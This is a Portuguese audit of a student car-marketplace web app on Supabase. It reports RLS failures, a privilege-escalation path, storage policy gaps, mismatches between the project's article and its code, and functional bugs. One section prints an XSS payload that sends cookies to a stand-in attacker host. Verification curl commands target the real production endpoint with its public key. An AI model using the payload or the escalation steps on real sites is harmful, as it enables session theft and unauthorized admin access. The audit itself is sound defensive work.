# MGMOTORS — Levantamentos verificados

**Data da auditoria:** 22/10/2026  
**Commit de referência:** `aa3b38e` (branch `main`, 55 commits)  
**Ambiente de produção:** `https://mgmotorss.vercel.app`  
**Banco:** Supabase `ilswwmjojfuvcgyymymb.supabase.co`  
**Natureza:** levantamento técnico e acadêmico. Nenhuma alteração foi feita em código, banco ou produção.

> Este documento reúne **o que foi verificado**. O planejamento das correções está em `PROXIMOS-PASSOS-20261022.md`. O relatório completo, com patches e análise estendida, está em `ANALISE-COMPLETA-20261022.md`.

---

## Como interpretar os rótulos

| Rótulo | Significado |
|---|---|
| **CONFIRMADO** | Reproduzido no código atual ou em produção em 22/10/2026. |
| **CORRIGIDO NO REPO** | Há alteração no repositório que resolve o ponto, mas ela não foi aplicada/validada no deploy. |
| **PENDENTE** | Problema real, sem correção no repositório nem em produção. |
| **NÃO REPRODUZIDO** | A auditoria anterior afirmava o problema, mas o código/schema atual não sustenta a afirmação. |

Prioridade:

- **P0** — segurança, integridade do artigo ou bloqueio de demonstração.
- **P1** — prejudica a experiência ou a defesa, mas tem contorno.
- **P2** — melhoria desejável.

---

## 1. Resumo executivo

O projeto é **defensável e acima da média para um curso técnico**. Os fluxos centrais existem e funcionam sobre um banco PostgreSQL real com RLS, triggers e separação de entidades.

Os riscos não estão na ausência de produto, e sim em três pontos:

1. **Segurança incompleta:** o teste de RLS segue em **17 PASS / 4 FAIL**, e a migration de correção está fora do Git e não aplicada.
2. **Artigo maior que o código:** UCs 09, 15, 20, 24 e 25 são apresentados como implementados, mas não existem; o Quadro 6 agrupa esses UCs em cenários marcados como PASS.
3. **Bugs de demonstração:** links quebrados em blogs, parâmetros de URL ignorados, aba inacessível, aprovação sem checagem de erro, toast invisível e configuração que derruba todas as páginas.

A recomendação é **corrigir e reduzir alegações**, não adicionar funcionalidades.

---

## 2. Estado do repositório

| Item | Valor |
|---|---|
| Branch | `main` |
| Commits | 55 |
| Último commit | `aa3b38e` — `fix: harden legal consent and account flows` (08/10/2026) |
| HTML | 25 arquivos, 8.522 linhas |
| CSS | 22 arquivos, 8.138 linhas |
| JS | 6 arquivos, 618 linhas |
| SQL | 6 arquivos, 8.512 linhas |
| Não versionados | `ANALISE-BANCA.md`, `ANALISE-COMPLETA-20261022.md`, 3 `.docx`, migration de hardening, `supabase/snapshots/`, `supabase/tests/` |

**Observação:** a migration de hardening e o script de teste precisam entrar no Git. Sem histórico, não há evidência de correção.

---

## 3. Deploy

| Domínio | O que serve | `/api/config` | Situação |
|---|---|---|---|
| `https://mgmotorss.vercel.app` | Aplicativo MGMOTORS real | JSON válido | **Correto** |
| `https://mgmotors.vercel.app` | Aplicativo Angular não relacionado | HTML | **Errado** |
| `https://mgmotors-zeta.vercel.app` | Redireciona para `mgmotorss` | — | Aceitável |

- **21 arquivos HTML** declaram canonical para o domínio errado.
- O `mgConfig.js` busca `/api/config` por caminho relativo; no domínio errado recebe HTML e falha.
- Se a banca abrir o link divulgado e cair no domínio antigo, verá outro aplicativo.

**Status:** **CONFIRMADO / P0**.

---

## 4. Segurança e banco

### 4.1 Resultado do teste de RLS

Execução de 22/10/2026, somente seções `[1]–[4]` do script (as seções `[5]–[7]` são destrutivas):

```
17 PASS / 4 FAIL
```

| # | Verificação | Esperado | Obtido | Status |
|---|---|---|---|---|
| S1 | `anon SELECT avaliacoes` | vazio | retorna linhas | **CONFIRMADO / FAIL** |
| S2 | `anon SELECT fotos_anuncio` | ≤ fotos de anúncios ativos | 49 fotos vs 4 anúncios ativos | **CONFIRMADO / FAIL** |
| S3 | `anon RPC promover_moderador` | 400/401/403 | HTTP 204 | **CONFIRMADO / FAIL** |
| S4 | `anon RPC criar_tabela_carrinho` | 400/401/403/404 | HTTP 204 | **CONFIRMADO / FAIL** |

As outras 17 verificações passaram: leitura anônima de `usuarios`, `usuarios_banidos`, `mensagens` e `config_usuario`; escrita anônima em curtidas, usuários, anúncios, fotos, avaliações e comunidade; e storage anônimo.

**Impacto por falha:**

- **S1:** expõe `avaliador_id`, `avaliado_id` e nota — quem avaliou quem.
- **S2:** fotos de anúncios pausados, rejeitados ou invisíveis continuam públicas.
- **S3:** função `SECURITY DEFINER` com `GRANT` para `anon`; o guard `auth.uid() IS NOT NULL` não protege anônimo, porque `auth.uid()` é `NULL`.
- **S4:** DDL executável por anônimo; cria tabela em runtime.

### 4.2 Cadeia de escalação de privilégio

O vetor é real e decorre do schema atual:

1. O usuário autenticado pode deletar o próprio perfil (`Usuarios deletam sua conta`).
2. Pode inserir um novo perfil com `moderador = true` e `is_admin = true` (`usuarios insert proprio` só exige `id = auth.uid()`).
3. O trigger `proteger_campos_sensiveis_usuarios` é **BEFORE UPDATE**, não cobre INSERT.
4. `is_admin()` passa a retornar `true`.
5. O usuário ganha acesso ao painel administrativo.

**Status:** **CONFIRMADO / P0**.

A migration de hardening fecha isso em três camadas: policy de INSERT com flags forçadas, trigger `BEFORE INSERT` e trigger `BEFORE UPDATE` ampliado.

### 4.3 A migration de hardening

Arquivo: `supabase/migrations/20261020120000_security_hardening.sql`  
596 linhas. **Não versionado, não aplicado.**

| Bloco | Cobertura | Situação |
|---|---|---|
| 0 | Aborta se houver e-mail duplicado | OK |
| 1 | Fecha INSERT/UPDATE em `usuarios`, adiciona FK para `auth.users` | OK |
| 2 | Revoga `promover_moderador`, remove `criar_tabela_carrinho`, recria `carrinho_itens`, fixa `search_path` | OK, com ressalva |
| 3 | Remove leitura anônima de `avaliacoes` | OK |
| 4 | Remove policy pública que anulava checagem de `fotos_anuncio` | OK |
| 5 | Separa policies `FOR ALL USING (true)` de curtidas | OK |
| 6 | Restringe conversas/mensagens ao participante | OK |
| 7 | Reescreve policies de storage exigindo dono no caminho | **Incompleto** |
| 8 | Mantém `usuarios_publicos` como `SECURITY DEFINER` | Intencional |
| 9 | Bloco de verificação final | OK, mas não valida os nomes com bug |

**Falha concreta:** a migration executa

```sql
DROP POLICY IF EXISTS "fc_insert" ON storage.objects;
DROP POLICY IF EXISTS "fg_insert" ON storage.objects;
```

Mas as policies reais são **`fc_upload`** e **`fg_upload`**. Os `DROP` são no-ops silenciosos e os uploads permissivos continuam:

```sql
CREATE POLICY "fc_upload" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'FOTOS-COMUNIDADE');

CREATE POLICY "fg_upload" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'FOTOS-GARAGEM');
```

Qualquer usuário autenticado envia arquivo sem checar o dono do caminho.

**Status:** **PENDENTE / P0**.

### 4.4 O que a migration não resolve

- XSS por URL de imagem.
- Bucket público de fotos de chat.
- Oráculo de curtidas em `get_anuncios_marketplace`.
- Toggles de privacidade sem aplicação no banco.
- Funcionalidades ausentes do artigo.
- E-mails de desenvolvedores no frontend.
- Rate limiting e limites de upload.
- Testes automatizados de regressão.

### 4.5 Storage e fotos de chat

O schema tem 28 policies em `storage.objects`. A maioria checa **apenas `bucket_id`**, não o dono do caminho.

No chat:

```js
// MG-MENSAGENS/mensagens.html:533-537
const caminho = `mensagens/${usuarioAtual.id}/${Date.now()}.${ext}`;
await supabase.storage.from('FOTOS-ANUNCIOS').upload(caminho, file);
const { data } = supabase.storage.from('FOTOS-ANUNCIOS').getPublicUrl(caminho);
```

Problemas:

1. Fotos privadas vão para o bucket público dos anúncios.
2. A policy de leitura só verifica `bucket_id`.
3. `getPublicUrl` gera URL pública que **não passa por RLS**.
4. Não há vínculo entre arquivo e conversa.

**Status:** **CONFIRMADO / P1** (P0 se a demo exibir chat com foto).

### 4.6 XSS por URL de imagem

| Arquivo | Linha | Campo |
|---|---|---|
| `MG-MARKETPLACE/marketplace.html` | 593 | `anuncio.foto_principal` |
| `MG-MARKETPLACE/marketplace.html` | 603 | `anuncio.vendedor_foto` |
| `MG-INICIO/inicio.html` | 414 | `foto` |
| `MG-CONTA/conta.html` | 406 | `foto` (cards pausados) |
| `MG-CONTA/conta.html` | 431 | `foto` (anúncios de outro usuário) |
| `MG-DEV/devpanel.html` | 406, 460, 470, 481, 558, 601 | fotos de anúncio, denunciante, alvo e usuário |

Vetor: quebra de atributo com `"` + `onerror`, por exemplo:

```
x" onerror="fetch('https://atacante/?c='+document.cookie)
```

`mgConfig.js` já exporta `escapeHtml`, mas essas páginas não o aplicam às imagens. `devpanel.html` tem uma cópia local, usada só em texto.

**Status:** **CONFIRMADO / P0**.

### 4.7 RPC `get_anuncios_marketplace`

A função é `SECURITY DEFINER`, recebe `usuario_id_param` arbitrário e tem `GRANT EXECUTE` para `PUBLIC`, `anon` e `authenticated`.

```sql
CASE
  WHEN usuario_id_param IS NULL THEN FALSE
  ELSE EXISTS (
    SELECT 1 FROM public.curtidas_anuncio ca
    WHERE ca.anuncio_id = a.id
      AND ca.usuario_id = usuario_id_param
  )
END AS usuario_curtiu
```

Como o parâmetro não é confrontado com `auth.uid()`, qualquer pessoa pode passar o UUID de outra e descobrir quais anúncios ela curtiu.

Além disso:

- sem `LIMIT`/paginação;
- sem `search_path` fixo (a migration corrige isso);
- ignora o RLS de `usuarios` ao expor a foto do vendedor.

**Status:** **CONFIRMADO / P1**.

### 4.8 Exposição de e-mails e lógica de admin

| Arquivo | Linha | Conteúdo |
|---|---|---|
| `MG-DEV/devpanel.html` | 273 | `ADMIN_EMAILS = ['murilofrank157@gmail.com']` |
| `MG-DEV/devpanel.html` | 325 | E-mail de admin pré-preenchido |
| `MG-CONFIGURACOES/configuracoes.html` | 245 | 3 e-mails de desenvolvedores |

O e-mail sozinho não concede acesso — a autorização real é `is_admin()` no banco. Mas expõe dados pessoais, revela a lógica do painel e aparece no “Exibir código-fonte”.

**Status:** **CONFIRMADO / P0** (LGPD e imagem do projeto).

### 4.9 Script de teste destrutivo

`supabase/tests/rls-security-check.sh`, seção `[6]`:

1. Deleta o perfil do usuário de teste.
2. Nunca o recria.
3. `before` é capturado e não usado.
4. O comentário afirma restauração, o que é falso.
5. Se o INSERT for bloqueado, o perfil continua deletado.

**Regra:** nunca rodar `[5]`, `[6]` ou `[7]` contra produção. Usar Supabase local ou staging descartável, com `trap` de limpeza.

**Status:** **CONFIRMADO / P0 de processo**.

### 4.10 Privacidade

O frontend exibe opções de privacidade, mas não há evidência de que `config_usuario` seja aplicado nas policies de `usuarios`, `mensagens` e `anuncios`. Se não for, os toggles são decorativos.

**Status:** **PENDENTE / P1**.

### 4.11 Itens não reproduzidos ou já corretos

| Alegação anterior | Resultado |
|---|---|
| `quilometragem` nula causa `TypeError` em `toLocaleString()` | **NÃO REPRODUZIDO** — a coluna é `NOT NULL`; guarda defensiva ainda é prudente |
| “Reativar anúncio” está geralmente quebrado | **NÃO REPRODUZIDO** — pausados mantêm `status='ativo'`; rejeitados escondem o botão |
| `devpanel.css` inteiro é essencial | **CONFIRMADO com impacto limitado** — a maior parte do CSS é inline; o que falta é o toast |
| Service role key exposta no frontend | **NÃO REPRODUZIDO** — só a chave pública é usada |
| `usuarios_publicos` como `SECURITY DEFINER` é falha | **CONFIRMADO, intencional** — expõe só colunas de apresentação |
| Artigo tem ~5.600 palavras | **CORRIGIDO** — o texto do `professor` tem ~3.583 palavras |

---

## 5. Defeitos funcionais

| # | Defeito | Evidência | Status | Prioridade |
|---|---|---|---|---|
| F01 | Links do header quebram nos blogs | `headerGlobal.js:35` usa `../MG-DICAS/dicas.html`; blogs estão a 3 níveis | CONFIRMADO | P1 |
| F02 | `?categoria=` ignorado | `inicio.html:82-106` envia; marketplace só lê `carro` | CONFIRMADO | P1 |
| F03 | `?anunciar=1` ignorado | `inicio.html:52,257` envia; marketplace não lê | CONFIRMADO | P1 |
| F04 | Aba “Pausados” inalcançável | `conta.html:67-69` sem botão; `#tab-pausados` em `:103` | CONFIRMADO | P1 |
| F05 | Aprovação ignora erro | `devpanel.html:418-421` sem checar `.error` | CONFIRMADO | P1 |
| F06 | Toast invisível | `devpanel.css` não linkado; sem regra `.toast` no projeto | CONFIRMADO | P1 |
| F07 | `mgConfig.js` derruba tudo | `mgConfig.js:12-21` lança no topo do módulo | CONFIRMADO | P1 |
| F08 | Chat não resolve terceiros | `mensagens.html:221,280,413` lê `usuarios`; policy é self/admin | CONFIRMADO | P1 |
| F09 | Conta lê `usuarios` direto | `conta.html:457` | CONFIRMADO | P1 |
| F10 | Busca sem debounce | `marketplace.html:813` filtra a cada tecla | CONFIRMADO | P2 |
| F11 | `toLocaleString()` sem guarda | `conta.html:406,431`; schema `NOT NULL` | NÃO REPRODUZIDO | P2 |
| F12 | “Reativar” quebrado | `conta.html:403` | NÃO REPRODUZIDO | — |
| F13 | `devpanel.css` morto | Sem `<link>` | CONFIRMADO, impacto limitado | P2 |
| F14 | Modais sem acessibilidade | Sem `role`, `aria-modal`, foco, ESC | CONFIRMADO | P1 |
| F15 | Consentimento dispensável | “Agora não”; loop se RPC falhar | CONFIRMADO | P1 |
| F16 | `usuarios_publicos` incompleto | Chat/conta ainda usam `usuarios` | CONFIRMADO | P1 |
| F17 | Upload de chat público | `mensagens.html:533-537` | CONFIRMADO | P1 |
| F18 | Sem paginação na RPC | Função sem `LIMIT` | CONFIRMADO | P2 |
| F19 | Marca inconsistente | Variante `MGMOTORSBR` | CONFIRMADO | P1 |
| F20 | Canonicals errados | 21 arquivos | CONFIRMADO | P0 |

---

## 6. Matriz de casos de uso

| UC | Nome | Status | Lacuna |
|---|---|---|---|
| UC01 | Cadastrar usuário | Implementado | — |
| UC02 | Realizar login | Implementado | — |
| UC03 | Recuperar senha | Implementado | Testar com e-mail real |
| UC04 | Pesquisar veículos | **Parcial** | Sem filtros de ano, modelo, km, combustível, câmbio, cor |
| UC05 | Visualizar detalhes | Implementado | — |
| UC06 | Favoritar | Implementado | — |
| UC07 | Contatar vendedor | Implementado | WhatsApp + mensagem interna |
| UC08 | Publicar anúncio | Implementado | — |
| UC09 | Editar anúncio | **Não implementado** | Nenhum fluxo de edição |
| UC10 | Excluir anúncio | Implementado | — |
| UC11 | Gerenciar meus anúncios | **Parcial** | Sem editar; aba pausados inacessível |
| UC12 | Denunciar anúncio | Implementado | — |
| UC13 | Administrar usuários | **Parcial** | Sem editar dados |
| UC14 | Moderar anúncios | **Parcial** | Aprovação sem erro; sem justificativa persistida |
| UC15 | Gerenciar categorias | **Não implementado** | Categorias no banco, sem CRUD |
| UC16 | Painel administrativo | **Parcial** | Sem relatórios/exportação |
| UC17 | Gerenciar perfil | Implementado | — |
| UC18 | Alterar senha | Implementado | — |
| UC19 | Ver perfil do vendedor | Implementado | — |
| UC20 | Marcar como vendido | **Não implementado** | Nenhuma ocorrência |
| UC21 | Receber notificações | **Parcial / não funcional** | Só toasts efêmeros |
| UC22 | Filtrar e ordenar | **Parcial** | Ordenação completa; filtros limitados |
| UC23 | Sair da conta | Implementado | — |
| UC24 | Compartilhar anúncio | **Não implementado** | Nenhuma ocorrência |
| UC25 | Formulário de contato | **Não implementado** | Página estática com `mailto:` |

**Resumo:** 13 implementados, 7 parciais, 5 não implementados.

### 6.1 Requisitos funcionais

| RF | Status | Observação |
|---|---|---|
| RF01 | Implementado | Contas em geral |
| RF02 | **Parcial** | Filtros limitados |
| RF03 | Implementado | — |
| RF04 | Implementado | — |
| RF05 | Implementado | — |
| RF06 | **Parcial** | Sem editar |
| RF07 | **Não implementado** | Vendido |
| RF08 | Implementado | — |
| RF09 | **Parcial** | Sem editar usuários |
| RF10 | **Parcial** | Sem justificativa persistida |
| RF11 | **Não implementado** | Categorias |
| RF12 | **Parcial** | Sem relatórios |
| RF13 | Implementado | — |
| RF14 | **Parcial / não funcional** | Notificações |
| RF15 | **Não implementado** | Compartilhar |
| RF16 | **Não implementado** | Formulário de contato |

---

## 7. Artigo × código

### 7.1 Variantes do documento

| Arquivo | Imagens | “MGMOTORSBR” | Uso recomendado |
|---|---|---|---|
| `ArtigoMG_revisado_professor.docx` | 9 | 0 | **Fonte canônica do texto** |
| `ArtigoMG_revisado_MGMOTORSBR.docx` | 11 | 18 | Diagrama de casos de uso e logos |
| `ArtigoMG_revisado_modelo_biopark.docx` | 10 | Template | **Fonte canônica do template** |

**Estratégia:** um texto, um template, importações pontuais. Parar de editar três arquivos em paralelo.

### 7.2 Alegações não sustentadas pelo código

| Alegação | Onde | Realidade | Correção |
|---|---|---|---|
| UC09 — editar anúncio | Quadros 3 e 6 | Não existe | Marcar como não implementado |
| UC15 — gerenciar categorias | Quadro 3 / RF11 | Sem CRUD | Remover “Sim” |
| UC20 — marcar como vendido | Quadro 3 / RF07 | Não existe | Remover ou “Não” |
| UC21 — notificações | Quadro 3 / RF14 | Só toasts | Manter FAIL |
| UC24 — compartilhar | Quadro 3 / RF15 | Não existe | Remover |
| UC25 — formulário de contato | Quadro 3 / RF16 / Quadro 6 | Só `mailto:` | Remover ou implementar |
| Filtros estendidos | Quadro 3 / RF02 | Não existem | “Parcial” |
| RF06 — editar | Quadro 3 | Não existe | “Parcial” |
| RF09 — editar usuários | Texto | Só banir | “Parcial” |
| RF10 — justificativa | Texto | Não persistida | “Parcial” |
| RF12 — relatórios | Texto | Não existem | “Parcial” |

### 7.3 Quadro 6 — problema estrutural

O quadro agrupa vários UCs por linha e marca PASS mesmo quando um dos UCs do grupo não existe. Exemplo: `UC05/UC08–UC11` é marcado PASS, mas UC09 não existe. A regra editorial deve ser: **nunca agrupar UC implementado com UC não implementado na mesma linha PASS**.

### 7.4 Figuras

| Figura | Conteúdo | Situação |
|---|---|---|
| Figura 4 | Tela inicial | Captura real |
| Figura 5 | Login | Captura real |
| Figura 6 | Busca, filtros e anúncios | Mockup/representação |
| Figura 7 | Moderação e atendimento | Mockup/representação |
| Figura 8 | Detalhe e publicação | Mockup com “IMAGEM DO VEÍCULO” |

**Ação:** substituir 6–8 por capturas reais. Com 4 anúncios ativos, é possível publicar um anúncio de teste com fotos e capturar tudo.

---

## 8. Inventário de arquivos relevantes

| Arquivo | Papel |
|---|---|
| `ANALISE-BANCA.md` | Auditoria anterior (697 linhas), preservada |
| `ANALISE-COMPLETA-20261022.md` | Relatório completo, com patches |
| `LEVANTAMENTOS-20261022.md` | Este documento |
| `PROXIMOS-PASSOS-20261022.md` | Plano de ação |
| `supabase/migrations/20261020120000_security_hardening.sql` | Hardening não aplicado |
| `supabase/tests/rls-security-check.sh` | Teste de RLS, destrutivo em `[5]–[7]` |
| `supabase/snapshots/schema_producao_20261020.sql` | Snapshot do schema de produção |
| `MG-MARKETPLACE/marketplace.html` | Busca, filtros, publicação, XSS |
| `MG-CONTA/conta.html` | Perfil, abas, XSS, leitura de `usuarios` |
| `MG-MENSAGENS/mensagens.html` | Chat, upload público |
| `MG-DEV/devpanel.html` | Moderação, e-mails, aprovação sem erro |
| `headerGlobal.js` | Navegação e banner de consentimento |
| `mgConfig.js` | Configuração central e `escapeHtml` |

---

## 9. Comandos de verificação

### 9.1 Estado do repositório

```bash
cd /home/murilo/PROJETOS/MGMOTORS
git status --short
git log --oneline -5
find . -name '*.html' -not -path './.git/*' | wc -l
```

### 9.2 Deploy

```bash
curl -s https://mgmotorss.vercel.app/api/config | head
curl -s -o /dev/null -w '%{http_code}\n' https://mgmotors.vercel.app/api/config
```

### 9.3 Teste de RLS sem as seções destrutivas

```bash
export SUPABASE_URL="https://ilswwmjojfuvcgyymymb.supabase.co"
export SUPABASE_ANON_KEY="sb_publishable_0vy8zcMmKEd8oomSUQvJ4Q_SMpqFcxD"
# Não exportar AUTH_TOKEN/AUTH_UID: assim [5]-[7] são ignorados.
./supabase/tests/rls-security-check.sh
```

### 9.4 Evidências dos quatro FAILs

```bash
# S1 — avaliações
curl -s "$SUPABASE_URL/rest/v1/avaliacoes?select=id,avaliador_id,avaliado_id,nota&limit=5" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY"

# S2 — fotos
curl -s -I "$SUPABASE_URL/rest/v1/fotos_anuncio?select=id&limit=1" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Prefer: count=exact"

# S3/S4 — RPCs
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$SUPABASE_URL/rest/v1/rpc/promover_moderador" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{"p_email":"x@test.invalid"}'

curl -s -o /dev/null -w '%{http_code}\n' -X POST "$SUPABASE_URL/rest/v1/rpc/criar_tabela_carrinho" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{}'
```

### 9.5 Busca de padrões perigosos

```bash
grep -rn '\${.*foto.*}' --include='*.html' MG-* | head -30
grep -rn 'from("usuarios")' --include='*.html' .
grep -rn '@gmail.com\|@hotmail.com' --include='*.html' .
grep -rl 'mgmotors.vercel.app' --include='*.html' . | wc -l
```

---

## 10. Limites deste levantamento

- Não foram executados testes destrutivos em produção.
- Não foi possível confirmar a data exata da banca.
- Não foi verificada a configuração de e-mail do Supabase para recuperação de senha.
- Não foi testada a aplicação dos toggles de privacidade com dois usuários reais.
- Não foi medido desempenho com base representativa.
- Não foi avaliada a política de retenção do Chatling.
- Não foi aplicada a migration de hardening; o estado de produção é o de 22/10/2026.

Esses pontos estão registrados como perguntas abertas no plano de ação.
